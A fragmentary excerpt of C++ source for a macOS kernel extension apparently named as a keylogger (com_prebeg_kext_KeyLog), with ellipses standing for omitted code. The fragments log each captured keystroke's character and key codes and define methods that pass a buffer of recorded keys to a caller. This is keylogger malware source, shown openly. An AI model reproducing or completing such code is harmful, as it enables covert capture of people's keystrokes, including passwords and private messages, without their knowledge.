...
// This required macro defines the class's constructors, destructors,
...
//#ifdef DEBUG
    IOLog( "%s Key [%c] (%04x %04x)\n", getName(), charCode, keyData, charCode );
//#endif
...
IOReturn com_prebeg_kext_KeyLog::BuffandKeys( UInt32* size, UInt32* keys )
{
	*size = buffsize;
	*keys = kextKeys;
...
IOReturn com_prebeg_kext_KeyLog::Buffer( bufferStruct* inStruct )
{
	if(buffsize)
	{
